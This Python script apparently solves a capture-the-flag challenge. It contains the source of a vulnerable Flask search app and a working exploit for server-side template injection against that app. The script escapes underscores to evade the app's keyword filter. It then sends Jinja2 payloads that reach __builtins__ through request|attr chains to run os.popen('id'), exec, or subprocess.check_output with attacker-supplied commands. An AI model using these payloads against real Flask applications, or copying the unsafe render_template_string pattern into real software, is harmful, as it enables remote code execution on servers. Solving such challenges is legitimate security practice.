import html

import requests

_link = "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---filter-bypass"

"""
from flask import Flask, render_template_string, render_template, request
import os, string, random

app = Flask(__name__)

inputfile = open("/tmp/parcham.txt", "r") #parcham.txt contains parcham
parcham=inputfile.read();

def getrandom():
     return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(43))

key=getrandom()

f = open("_", "w")
f.write(key)
f.close()

app.config['parcham'] = ''.join(chr(ord(parcham[i]) ^ ord(key[len(parcham)-i-1])) for i in range(len(parcham)))

@app.route('/search', methods =['POST'])
def search():
        try:
            search_something = request.values.get('search_something')
        except Exception as e:
            print(e)
            return 'exception 1: something went wrong'

        try:
            if '.' in search_something or
             '_' in search_something or
              "'" in search_something or
               'config' in search_something  or
                '/' in search_something  or
                 'tmp' in search_something  or
                  '[' in search_something  or
                   ']' in search_something  or 
                   'join' in search_something:
                    return render_template_string("oh Nooo! your search expression is in my filter list")
            elif 'Pizza' in search_something or 'Pasta' in search_something:
                    return render_template_string(" %s is a delicious food &#128525;" % search_something)
            else:
                return render_template_string("I'm only a baby search engine. I don't know what %s mean. Ask me about Pizza or Pasta &#128517;" % search_something)
        except Exception as e:
            print(e)
            return 'exception 2: something went wrong'

@app.route('/', methods=['GET'])
def index():
     return render_template('index.html')      

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

"""


def dastan(q):
    q = q.replace("_", "\\x5f")
    q = q.replace("\n", "")
    q = q.replace("'", '"')
    q = q.replace("[", '')
    q = "{{" + q + "}}"

    # q = "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}"
    # q = q.replace("'", '"')
    code = open("code.py", "r").read()
    print(code)
    print(q)
    resp = requests.post(
        "http://localhost:8080/search",
        params={
            "search_something": q,
            "a": code,
        }
    )
    text = resp.text
    text = html.unescape(text)
    text = text.replace("I'm only a baby search engine. I don't know what", "")
    text = text.replace('\\n', '\n')
    text = text.replace('\\r', '')
    text = text.replace('\\\'', '\'')

    print(text)
    f = open("res.html", "w+")
    f.write(text)
    f.close()


# self|attr(request|attr('__dict__')
"""
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
"""
exec_template = """
    request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('exec')
"""
code_template = """
    request|attr('args')|attr('__getitem__')('a')|attr('split')(' ')
"""
system_template = """
request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|
    attr('__getitem__')('__import__')('subprocess')|attr('check_output')
"""
dastan(f"{system_template}({code_template})")
# dastan(f"{exec_template}({python_code})")
